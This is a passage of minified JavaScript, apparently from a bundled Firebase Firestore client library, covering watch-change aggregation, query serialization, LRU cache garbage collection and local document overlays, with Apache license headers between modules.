e.De)e.ve&&e.ve.isFoundDocument()?this.et(n,e.ve):this.tt(n,e.key,e.ve);for(const n of e.removedTargetIds)this.tt(n,e.key,e.ve)}nt(e){this.forEachTarget(e,n=>{const i=this.rt(n);switch(e.state){case 0:this.it(n)&&i.ke(e.resumeToken);break;case 1:i.We(),i.Be||i.Qe(),i.ke(e.resumeToken);break;case 2:i.We(),i.Be||this.removeTarget(n);break;case 3:this.it(n)&&(i.Ge(),i.ke(e.resumeToken));break;case 4:this.it(n)&&(this.st(n),i.ke(e.resumeToken));break;default:ze(56790,{state:e.state})}})}forEachTarget(e,n){e.targetIds.length>0?e.targetIds.forEach(n):this.je.forEach((i,s)=>{this.it(s)&&n(s)})}ot(e){const n=e.targetId,i=e.Ce.count,s=this._t(n);if(s){const o=s.target;if(z0(o))if(i===0){const c=new Pe(o.path);this.tt(n,c,Wn.newNoDocument(c,Ye.min()))}else St(i===1,20013,{expectedCount:i});else{const c=this.ut(n);if(c!==i){const d=this.ct(e),f=d?this.lt(d,e,c):1;if(f!==0){this.st(n);const p=f===2?"TargetPurposeExistenceFilterMismatchBloom":"TargetPurposeExistenceFilterMismatch";this.Ze=this.Ze.insert(n,p)}}}}}ct(e){const n=e.Ce.unchangedNames;if(!n||!n.bits)return null;const{bits:{bitmap:i="",padding:s=0},hashCount:o=0}=n;let c,d;try{c=qa(i).toUint8Array()}catch(f){if(f instanceof eS)return mc("Decoding the base64 bloom filter in existence filter failed ("+f.message+"); ignoring the bloom filter and falling back to full re-query."),null;throw f}try{d=new c_(c,s,o)}catch(f){return mc(f instanceof nd?"BloomFilter error: ":"Applying bloom filter failed: ",f),null}return d.pe===0?null:d}lt(e,n,i){return n.Ce.count===i-this.Tt(e,n.targetId)?0:2}Tt(e,n){const i=this.ze.getRemoteKeysForTarget(n);let s=0;return i.forEach(o=>{const c=this.ze.Pt(),d=`projects/${c.projectId}/databases/${c.database}/documents/${o.path.canonicalString()}`;e.mightContain(d)||(this.tt(n,o,null),s++)}),s}It(e){const n=new Map;this.je.forEach((o,c)=>{const d=this._t(c);if(d){if(o.current&&z0(d.target)){const f=new Pe(d.target.path);this.Et(f).has(c)||this.dt(c,f)||this.tt(c,f,Wn.newNoDocument(f,e))}o.Le&&(n.set(c,o.qe()),o.Qe())}});let i=ct();this.Ye.forEach((o,c)=>{let d=!0;c.forEachWhile(f=>{const p=this._t(f);return!p||p.purpose==="TargetPurposeLimboResolution"||(d=!1,!1)}),d&&(i=i.add(o))}),this.He.forEach((o,c)=>c.setReadTime(e));const s=new mp(e,n,this.Ze,this.He,i);return this.He=Us(),this.Je=Sf(),this.Ye=Sf(),this.Ze=new un(Xe),s}et(e,n){if(!this.it(e))return;const i=this.dt(e,n.key)?2:0;this.rt(e).$e(n.key,i),this.He=this.He.insert(n.key,n),this.Je=this.Je.insert(n.key,this.Et(n.key).add(e)),this.Ye=this.Ye.insert(n.key,this.At(n.key).add(e))}tt(e,n,i){if(!this.it(e))return;const s=this.rt(e);this.dt(e,n)?s.$e(n,1):s.Ue(n),this.Ye=this.Ye.insert(n,this.At(n).delete(e)),this.Ye=this.Ye.insert(n,this.At(n).add(e)),i&&(this.He=this.He.insert(n,i))}removeTarget(e){this.je.delete(e)}ut(e){const n=this.rt(e).qe();return this.ze.getRemoteKeysForTarget(e).size+n.addedDocuments.size-n.removedDocuments.size}Ke(e){this.rt(e).Ke()}rt(e){let n=this.je.get(e);return n||(n=new AA,this.je.set(e,n)),n}At(e){let n=this.Ye.get(e);return n||(n=new vn(Xe),this.Ye=this.Ye.insert(e,n)),n}Et(e){let n=this.Je.get(e);return n||(n=new vn(Xe),this.Je=this.Je.insert(e,n)),n}it(e){const n=this._t(e)!==null;return n||xe("WatchChangeAggregator","Detected inactive target",e),n}_t(e){const n=this.je.get(e);return n&&n.Be?null:this.ze.Rt(e)}st(e){this.je.set(e,new AA),this.ze.getRemoteKeysForTarget(e).forEach(n=>{this.tt(e,n,null)})}dt(e,n){return this.ze.getRemoteKeysForTarget(e).has(n)}}function Sf(){return new un(Pe.comparator)}function EA(){return new un(Pe.comparator)}const I8={asc:"ASCENDING",desc:"DESCENDING"},k8={"<":"LESS_THAN","<=":"LESS_THAN_OR_EQUAL",">":"GREATER_THAN",">=":"GREATER_THAN_OR_EQUAL","==":"EQUAL","!=":"NOT_EQUAL","array-contains":"ARRAY_CONTAINS",in:"IN","not-in":"NOT_IN","array-contains-any":"ARRAY_CONTAINS_ANY"},D8={and:"AND",or:"OR"};class M8{constructor(e,n){this.databaseId=e,this.useProto3Json=n}}function H0(t,e){return t.useProto3Json||ap(e)?e:{value:e}}function wm(t,e){return t.useProto3Json?`${new Date(1e3*e.seconds).toISOString().replace(/\.\d*/,"").replace("Z","")}.${("000000000"+e.nanoseconds).slice(-9)}Z`:{seconds:""+e.seconds,nanos:e.nanoseconds}}function RS(t,e){return t.useProto3Json?e.toBase64():e.toUint8Array()}function O8(t,e){return wm(t,e.toTimestamp())}function $r(t){return St(!!t,49232),Ye.fromTimestamp(function(n){const i=Ha(n);return new yn(i.seconds,i.nanos)}(t))}function u_(t,e){return q0(t,e).canonicalString()}function q0(t,e){const n=function(s){return new qt(["projects",s.projectId,"databases",s.database])}(t).child("documents");return e===void 0?n:n.child(e)}function IS(t){const e=qt.fromString(t);return St(PS(e),10190,{key:e.toString()}),e}function G0(t,e){return u_(t.databaseId,e.path)}function a0(t,e){const n=IS(e);if(n.get(1)!==t.databaseId.projectId)throw new ke(fe.INVALID_ARGUMENT,"Tried to deserialize key from different project: "+n.get(1)+" vs "+t.databaseId.projectId);if(n.get(3)!==t.databaseId.database)throw new ke(fe.INVALID_ARGUMENT,"Tried to deserialize key from different database: "+n.get(3)+" vs "+t.databaseId.database);return new Pe(DS(n))}function kS(t,e){return u_(t.databaseId,e)}function P8(t){const e=IS(t);return e.length===4?qt.emptyPath():DS(e)}function Y0(t){return new qt(["projects",t.databaseId.projectId,"databases",t.databaseId.database]).canonicalString()}function DS(t){return St(t.length>4&&t.get(4)==="documents",29091,{key:t.toString()}),t.popFirst(5)}function TA(t,e,n){return{name:G0(t,e),fields:n.value.mapValue.fields}}function j8(t,e){let n;if("targetChange"in e){e.targetChange;const i=function(p){return p==="NO_CHANGE"?0:p==="ADD"?1:p==="REMOVE"?2:p==="CURRENT"?3:p==="RESET"?4:ze(39313,{state:p})}(e.targetChange.targetChangeType||"NO_CHANGE"),s=e.targetChange.targetIds||[],o=function(p,v){return p.useProto3Json?(St(v===void 0||typeof v=="string",58123),Bn.fromBase64String(v||"")):(St(v===void 0||v instanceof Buffer||v instanceof Uint8Array,16193),Bn.fromUint8Array(v||new Uint8Array))}(t,e.targetChange.resumeToken),c=e.targetChange.cause,d=c&&function(p){const v=p.code===void 0?fe.UNKNOWN:CS(p.code);return new ke(v,p.message||"")}(c);n=new NS(i,s,o,d||null)}else if("documentChange"in e){e.documentChange;const i=e.documentChange;i.document,i.document.name,i.document.updateTime;const s=a0(t,i.document.name),o=$r(i.document.updateTime),c=i.document.createTime?$r(i.document.createTime):Ye.min(),d=new pi({mapValue:{fields:i.document.fields}}),f=Wn.newFoundDocument(s,o,c,d),p=i.targetIds||[],v=i.removedTargetIds||[];n=new zf(p,v,f.key,f)}else if("documentDelete"in e){e.documentDelete;const i=e.documentDelete;i.document;const s=a0(t,i.document),o=i.readTime?$r(i.readTime):Ye.min(),c=Wn.newNoDocument(s,o),d=i.removedTargetIds||[];n=new zf([],d,c.key,c)}else if("documentRemove"in e){e.documentRemove;const i=e.documentRemove;i.document;const s=a0(t,i.document),o=i.removedTargetIds||[];n=new zf([],o,s,null)}else{if(!("filter"in e))return ze(11601,{Vt:e});{e.filter;const i=e.filter;i.targetId;const{count:s=0,unchangedNames:o}=i,c=new C8(s,o),d=i.targetId;n=new SS(d,c)}}return n}function L8(t,e){let n;if(e instanceof Gd)n={update:TA(t,e.key,e.value)};else if(e instanceof o_)n={delete:G0(t,e.key)};else if(e instanceof Za)n={update:TA(t,e.key,e.data),updateMask:Y8(e.fieldMask)};else{if(!(e instanceof A8))return ze(16599,{ft:e.type});n={verify:G0(t,e.key)}}return e.fieldTransforms.length>0&&(n.updateTransforms=e.fieldTransforms.map(i=>function(o,c){const d=c.transform;if(d instanceof Ad)return{fieldPath:c.field.canonicalString(),setToServerValue:"REQUEST_TIME"};if(d instanceof Ed)return{fieldPath:c.field.canonicalString(),appendMissingElements:{values:d.elements}};if(d instanceof Td)return{fieldPath:c.field.canonicalString(),removeAllFromArray:{values:d.elements}};if(d instanceof _m)return{fieldPath:c.field.canonicalString(),increment:d.Re};throw ze(20930,{transform:c.transform})}(0,i))),e.precondition.isNone||(n.currentDocument=function(s,o){return o.updateTime!==void 0?{updateTime:O8(s,o.updateTime)}:o.exists!==void 0?{exists:o.exists}:ze(27497)}(t,e.precondition)),n}function V8(t,e){return t&&t.length>0?(St(e!==void 0,14353),t.map(n=>function(s,o){let c=s.updateTime?$r(s.updateTime):$r(o);return c.isEqual(Ye.min())&&(c=$r(o)),new w8(c,s.transformResults||[])}(n,e))):[]}function U8(t,e){return{documents:[kS(t,e.path)]}}function B8(t,e){const n={structuredQuery:{}},i=e.path;let s;e.collectionGroup!==null?(s=i,n.structuredQuery.from=[{collectionId:e.collectionGroup,allDescendants:!0}]):(s=i.popLast(),n.structuredQuery.from=[{collectionId:i.lastSegment()}]),n.parent=kS(t,s);const o=function(p){if(p.length!==0)return OS(es.create(p,"and"))}(e.filters);o&&(n.structuredQuery.where=o);const c=function(p){if(p.length!==0)return p.map(v=>function(w){return{field:$l(w.field),direction:H8(w.dir)}}(v))}(e.orderBy);c&&(n.structuredQuery.orderBy=c);const d=H0(t,e.limit);return d!==null&&(n.structuredQuery.limit=d),e.startAt&&(n.structuredQuery.startAt=function(p){return{before:p.inclusive,values:p.position}}(e.startAt)),e.endAt&&(n.structuredQuery.endAt=function(p){return{before:!p.inclusive,values:p.position}}(e.endAt)),{gt:n,parent:s}}function z8(t){let e=P8(t.parent);const n=t.structuredQuery,i=n.from?n.from.length:0;let s=null;if(i>0){St(i===1,65062);const v=n.from[0];v.allDescendants?s=v.collectionId:e=e.child(v.collectionId)}let o=[];n.where&&(o=function(b){const w=MS(b);return w instanceof es&&uS(w)?w.getFilters():[w]}(n.where));let c=[];n.orderBy&&(c=function(b){return b.map(w=>function(C){return new vm(Xl(C.field),function(V){switch(V){case"ASCENDING":return"asc";case"DESCENDING":return"desc";default:return}}(C.direction))}(w))}(n.orderBy));let d=null;n.limit&&(d=function(b){let w;return w=typeof b=="object"?b.value:b,ap(w)?null:w}(n.limit));let f=null;n.startAt&&(f=function(b){const w=!!b.before,E=b.values||[];return new ym(E,w)}(n.startAt));let p=null;return n.endAt&&(p=function(b){const w=!b.before,E=b.values||[];return new ym(E,w)}(n.endAt)),s8(e,s,c,o,d,"F",f,p)}function F8(t,e){const n=function(s){switch(s){case"TargetPurposeListen":return null;case"TargetPurposeExistenceFilterMismatch":return"existence-filter-mismatch";case"TargetPurposeExistenceFilterMismatchBloom":return"existence-filter-mismatch-bloom";case"TargetPurposeLimboResolution":return"limbo-document";default:return ze(28987,{purpose:s})}}(e.purpose);return n==null?null:{"goog-listen-tags":n}}function MS(t){return t.unaryFilter!==void 0?function(n){switch(n.unaryFilter.op){case"IS_NAN":const i=Xl(n.unaryFilter.field);return gn.create(i,"==",{doubleValue:NaN});case"IS_NULL":const s=Xl(n.unaryFilter.field);return gn.create(s,"==",{nullValue:"NULL_VALUE"});case"IS_NOT_NAN":const o=Xl(n.unaryFilter.field);return gn.create(o,"!=",{doubleValue:NaN});case"IS_NOT_NULL":const c=Xl(n.unaryFilter.field);return gn.create(c,"!=",{nullValue:"NULL_VALUE"});case"OPERATOR_UNSPECIFIED":return ze(61313);default:return ze(60726)}}(t):t.fieldFilter!==void 0?function(n){return gn.create(Xl(n.fieldFilter.field),function(s){switch(s){case"EQUAL":return"==";case"NOT_EQUAL":return"!=";case"GREATER_THAN":return">";case"GREATER_THAN_OR_EQUAL":return">=";case"LESS_THAN":return"<";case"LESS_THAN_OR_EQUAL":return"<=";case"ARRAY_CONTAINS":return"array-contains";case"IN":return"in";case"NOT_IN":return"not-in";case"ARRAY_CONTAINS_ANY":return"array-contains-any";case"OPERATOR_UNSPECIFIED":return ze(58110);default:return ze(50506)}}(n.fieldFilter.op),n.fieldFilter.value)}(t):t.compositeFilter!==void 0?function(n){return es.create(n.compositeFilter.filters.map(i=>MS(i)),function(s){switch(s){case"AND":return"and";case"OR":return"or";default:return ze(1026)}}(n.compositeFilter.op))}(t):ze(30097,{filter:t})}function H8(t){return I8[t]}function q8(t){return k8[t]}function G8(t){return D8[t]}function $l(t){return{fieldPath:t.canonicalString()}}function Xl(t){return Un.fromServerFormat(t.fieldPath)}function OS(t){return t instanceof gn?function(n){if(n.op==="=="){if(hA(n.value))return{unaryFilter:{field:$l(n.field),op:"IS_NAN"}};if(dA(n.value))return{unaryFilter:{field:$l(n.field),op:"IS_NULL"}}}else if(n.op==="!="){if(hA(n.value))return{unaryFilter:{field:$l(n.field),op:"IS_NOT_NAN"}};if(dA(n.value))return{unaryFilter:{field:$l(n.field),op:"IS_NOT_NULL"}}}return{fieldFilter:{field:$l(n.field),op:q8(n.op),value:n.value}}}(t):t instanceof es?function(n){const i=n.getFilters().map(s=>OS(s));return i.length===1?i[0]:{compositeFilter:{op:G8(n.op),filters:i}}}(t):ze(54877,{filter:t})}function Y8(t){const e=[];return t.fields.forEach(n=>e.push(n.canonicalString())),{fieldPaths:e}}function PS(t){return t.length>=4&&t.get(0)==="projects"&&t.get(2)==="databases"}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ka{constructor(e,n,i,s,o=Ye.min(),c=Ye.min(),d=Bn.EMPTY_BYTE_STRING,f=null){this.target=e,this.targetId=n,this.purpose=i,this.sequenceNumber=s,this.snapshotVersion=o,this.lastLimboFreeSnapshotVersion=c,this.resumeToken=d,this.expectedCount=f}withSequenceNumber(e){return new ka(this.target,this.targetId,this.purpose,e,this.snapshotVersion,this.lastLimboFreeSnapshotVersion,this.resumeToken,this.expectedCount)}withResumeToken(e,n){return new ka(this.target,this.targetId,this.purpose,this.sequenceNumber,n,this.lastLimboFreeSnapshotVersion,e,null)}withExpectedCount(e){return new ka(this.target,this.targetId,this.purpose,this.sequenceNumber,this.snapshotVersion,this.lastLimboFreeSnapshotVersion,this.resumeToken,e)}withLastLimboFreeSnapshotVersion(e){return new ka(this.target,this.targetId,this.purpose,this.sequenceNumber,this.snapshotVersion,e,this.resumeToken,this.expectedCount)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Q8{constructor(e){this.wt=e}}function K8(t){const e=z8({parent:t.parent,structuredQuery:t.structuredQuery});return t.limitType==="LAST"?F0(e,e.limit,"L"):e}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class W8{constructor(){this.Cn=new $8}addToCollectionParentIndex(e,n){return this.Cn.add(n),de.resolve()}getCollectionParents(e,n){return de.resolve(this.Cn.getEntries(n))}addFieldIndex(e,n){return de.resolve()}deleteFieldIndex(e,n){return de.resolve()}deleteAllFieldIndexes(e){return de.resolve()}createTargetIndexes(e,n){return de.resolve()}getDocumentsMatchingTarget(e,n){return de.resolve(null)}getIndexType(e,n){return de.resolve(0)}getFieldIndexes(e,n){return de.resolve([])}getNextCollectionGroupToUpdate(e){return de.resolve(null)}getMinOffset(e,n){return de.resolve(Fa.min())}getMinOffsetFromCollectionGroup(e,n){return de.resolve(Fa.min())}updateCollectionGroup(e,n,i){return de.resolve()}updateIndexEntries(e,n){return de.resolve()}}class $8{constructor(){this.index={}}add(e){const n=e.lastSegment(),i=e.popLast(),s=this.index[n]||new vn(qt.comparator),o=!s.has(i);return this.index[n]=s.add(i),o}has(e){const n=e.lastSegment(),i=e.popLast(),s=this.index[n];return s&&s.has(i)}getEntries(e){return(this.index[e]||new vn(qt.comparator)).toArray()}}/**
 * @license
 * Copyright 2018 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const CA={didRun:!1,sequenceNumbersCollected:0,targetsRemoved:0,documentsRemoved:0},jS=41943040;class mi{static withCacheSize(e){return new mi(e,mi.DEFAULT_COLLECTION_PERCENTILE,mi.DEFAULT_MAX_SEQUENCE_NUMBERS_TO_COLLECT)}constructor(e,n,i){this.cacheSizeCollectionThreshold=e,this.percentileToCollect=n,this.maximumSequenceNumbersToCollect=i}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */mi.DEFAULT_COLLECTION_PERCENTILE=10,mi.DEFAULT_MAX_SEQUENCE_NUMBERS_TO_COLLECT=1e3,mi.DEFAULT=new mi(jS,mi.DEFAULT_COLLECTION_PERCENTILE,mi.DEFAULT_MAX_SEQUENCE_NUMBERS_TO_COLLECT),mi.DISABLED=new mi(-1,0,0);/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class vc{constructor(e){this.ur=e}next(){return this.ur+=2,this.ur}static cr(){return new vc(0)}static lr(){return new vc(-1)}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const SA="LruGarbageCollector",X8=1048576;function NA([t,e],[n,i]){const s=Xe(t,n);return s===0?Xe(e,i):s}class Z8{constructor(e){this.Er=e,this.buffer=new vn(NA),this.dr=0}Ar(){return++this.dr}Rr(e){const n=[e,this.Ar()];if(this.buffer.size<this.Er)this.buffer=this.buffer.add(n);else{const i=this.buffer.last();NA(n,i)<0&&(this.buffer=this.buffer.delete(i).add(n))}}get maxValue(){return this.buffer.last()[0]}}class J8{constructor(e,n,i){this.garbageCollector=e,this.asyncQueue=n,this.localStore=i,this.Vr=null}start(){this.garbageCollector.params.cacheSizeCollectionThreshold!==-1&&this.mr(6e4)}stop(){this.Vr&&(this.Vr.cancel(),this.Vr=null)}get started(){return this.Vr!==null}mr(e){xe(SA,`Garbage collection scheduled in ${e}ms`),this.Vr=this.asyncQueue.enqueueAfterDelay("lru_garbage_collection",e,async()=>{this.Vr=null;try{await this.localStore.collectGarbage(this.garbageCollector)}catch(n){Vc(n)?xe(SA,"Ignoring IndexedDB error during garbage collection: ",n):await Lc(n)}await this.mr(3e5)})}}class e9{constructor(e,n){this.gr=e,this.params=n}calculateTargetCount(e,n){return this.gr.pr(e).next(i=>Math.floor(n/100*i))}nthSequenceNumber(e,n){if(n===0)return de.resolve(sp.le);const i=new Z8(n);return this.gr.forEachTarget(e,s=>i.Rr(s.sequenceNumber)).next(()=>this.gr.yr(e,s=>i.Rr(s))).next(()=>i.maxValue)}removeTargets(e,n,i){return this.gr.removeTargets(e,n,i)}removeOrphanedDocuments(e,n){return this.gr.removeOrphanedDocuments(e,n)}collect(e,n){return this.params.cacheSizeCollectionThreshold===-1?(xe("LruGarbageCollector","Garbage collection skipped; disabled"),de.resolve(CA)):this.getCacheSize(e).next(i=>i<this.params.cacheSizeCollectionThreshold?(xe("LruGarbageCollector",`Garbage collection skipped; Cache size ${i} is lower than threshold ${this.params.cacheSizeCollectionThreshold}`),CA):this.wr(e,n))}getCacheSize(e){return this.gr.getCacheSize(e)}wr(e,n){let i,s,o,c,d,f,p;const v=Date.now();return this.calculateTargetCount(e,this.params.percentileToCollect).next(b=>(b>this.params.maximumSequenceNumbersToCollect?(xe("LruGarbageCollector",`Capping sequence numbers to collect down to the maximum of ${this.params.maximumSequenceNumbersToCollect} from ${b}`),s=this.params.maximumSequenceNumbersToCollect):s=b,c=Date.now(),this.nthSequenceNumber(e,s))).next(b=>(i=b,d=Date.now(),this.removeTargets(e,i,n))).next(b=>(o=b,f=Date.now(),this.removeOrphanedDocuments(e,i))).next(b=>(p=Date.now(),Kl()<=ot.DEBUG&&xe("LruGarbageCollector",`LRU Garbage Collection
	Counted targets in ${c-v}ms
	Determined least recently used ${s} in `+(d-c)+`ms
	Removed ${o} targets in `+(f-d)+`ms
	Removed ${b} documents in `+(p-f)+`ms
Total Duration: ${p-v}ms`),de.resolve({didRun:!0,sequenceNumbersCollected:s,targetsRemoved:o,documentsRemoved:b})))}}function t9(t,e){return new e9(t,e)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class n9{constructor(){this.changes=new nl(e=>e.toString(),(e,n)=>e.isEqual(n)),this.changesApplied=!1}addEntry(e){this.assertNotApplied(),this.changes.set(e.key,e)}removeEntry(e,n){this.assertNotApplied(),this.changes.set(e,Wn.newInvalidDocument(e).setReadTime(n))}getEntry(e,n){this.assertNotApplied();const i=this.changes.get(n);return i!==void 0?de.resolve(i):this.getFromCache(e,n)}getEntries(e,n){return this.getAllFromCache(e,n)}apply(e){return this.assertNotApplied(),this.changesApplied=!0,this.applyChanges(e)}assertNotApplied(){}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *//**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class i9{constructor(e,n){this.overlayedDocument=e,this.mutatedFields=n}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class r9{constructor(e,n,i,s){this.remoteDocumentCache=e,this.mutationQueue=n,this.documentOverlayCache=i,this.indexManager=s}getDocument(e,n){let i=null;return this.documentOverlayCache.getOverlay(e,n).next(s=>(i=s,this.remoteDocumentCache.getEntry(e,n))).next(s=>(i!==null&&ld(i.mutation,s,ji.empty(),yn.now()),s))}getDocuments(e,n){return this.remoteDocumentCache.getEntries(e,n).next(i=>this.getLocalViewOfDocuments(e,i,ct()).next(()=>i))}getLocalViewOfDocuments(e,n,i=ct()){const s=Po();return this.populateOverlays(e,s,n).next(()=>this.computeViews(e,n,s,i).next(o=>{let c=td();return o.forEach((d,f)=>{c=c.insert(d,f.overlayedDocument)}),c}))}getOverlayedDocuments(e,n){const i=Po();return this.populateOverlays(e,i,n).next(()=>this.computeViews(e,n,i,ct()))}populateOverlays(e,n,i){const s=[];return i.forEach(o=>{n.has(o)||s.push(o)}),this.documentOverlayCache.getOverlays(e,s).next(o=>{o.forEach((c,d)=>{n.set(c,d)})})}computeViews(e,n,i,s){let o=Us();const c=od(),d=function(){return od()}();return n.forEach((f,p)=>{const v=i.get(p.key);s.has(p.key)&&(v===void 0||v.mutation instanceof Za)?o=o.insert(p.key,p):v!==void 0?(c.set(p.key,v.mutation.getFieldMask()),ld(v.mutation,p,v.mutation.getFieldMask(),yn.now())):c.set(p.key,ji.empty())}),this.recalculateAndSaveOverlays(e,o).next(f=>(f.forEach((p,v)=>c.set(p,v)),n.forEach((p,v)=>{var b;return d.set(p,new i9(v,(b=c.get(p))!==null&&b!==void 0?b:null))}),d))}recalculateAndSaveOverlays(e,n){const i=od();let s=new un((c,d)=>c-d),o=ct();return this.mutationQueue.getAllMutationBatchesAffectingDocumentKeys(e,n).next(c=>{for(const d of c)d.keys().forEach(f=>{const p=n.get(f);if(p===null)return;let v=i.get(f)||ji.empty();v=d.applyToLocalView(p,v),i.set(f,v);const b=(s.get(d.batchId)||ct()).add(f);s=s.insert(d.batchId,b)})}).next(()=>{const c=[],d=s.getReverseIterator();for(;d.hasNext();){const f=d.getNext(),p=f.key,v=f.value,b=vS();v.forEach(w=>{if(!o.has(w)){const E=ES(n.get(w),i.get(w));E!==null&&b.set(w,E),o=o.add(w)}}),c.push(this.documentOverlayCache.saveOverlays(e,p,b))}return de.waitFor(c)}).next(()=>i)}recalculateAndSaveOverlaysForDocumentKeys(e,n){return this.remoteDocumentCache.getEntries(e,n).next(i=>this.recalculateAndSaveOverlays(e,i))}getDocumentsMatchingQuery(e,n,i,s){return function(c){return Pe.isDocumentKey(c.path)&&c.collectionGroup===null&&c.filters.length===0}(n)?this.getDocumentsMatchingDocumentQuery(e,n.path):a8(n)?this.getDocumentsMatchingCollectionGroupQuery(e,n,i,s):this.getDocumentsMatchingCollectionQuery(e,n,i,s)}getNextDocuments(e,n,i,s){return this.remoteDocumentCache.getAllFromCollectionGroup(e,n,i,s).next(o=>{const c=s-o.size>0?this.documentOverlayCache.getOverlaysForCollectionGroup(e,n,i.largestBatchId,s-o.size):de.resolve(Po());let d=_d,f=o;return c.next(p=>de.forEach(p,(v,b)=>(d<b.largestBatchId&&(d=b.largestBatchId),o.get(v)?de.resolve():this.remoteDocumentCache.getEntry(e,v).next(w=>{f=f.insert(v,w)}))).next(()=>this.populateOverlays(e,p,o)).next(()=>this.computeViews(e,f,p,ct())).next(v=>({batchId:d,changes:yS(v)})))})}getDocumentsMatchingDocumentQuery(e,n){return this.getDocument(e,new Pe(n)).next(i=>{let s=td();return i.isFoundDocument()&&(s=s.insert(i.key,i)),s})}getDocumentsMatchingCollectionGroupQuery(e,n,i,s){const o=n.collectionGroup;let c=td();return this.indexManager.getCollectionParents(e,o).next(d=>de.forEach(d,f=>{const p=function(b,w){return new lp(w,null,b.explicitOrderBy.slice(),b.filters.slice(),b.limit,b.limitType,b.startAt,b.endAt)}(n,f.child(o));return this.getDocumentsMatchingCollectionQuery(e,p,i,s).next(v=>{v.forEach((b,w)=>{c=c.insert(b,w)})})}).next(()=>c))}getDocumentsMatchingCollectionQuery(e,n,i,s){let o;return this.documentOverlayCache.getOverlaysForCollection(e,n.path,i.largestBatchId).next(c=>(o=c,this.remoteDocumentCache.getDocumentsMatchingQuery(e,n,i,o,s))).next(c=>{o.forEach((f,p)=>{const v=p.getKey();c.get(v)===null&&(c=c.insert(v,Wn.newInvalidDocument(v)))});let d=td();return c.forEach((f,p)=>{const 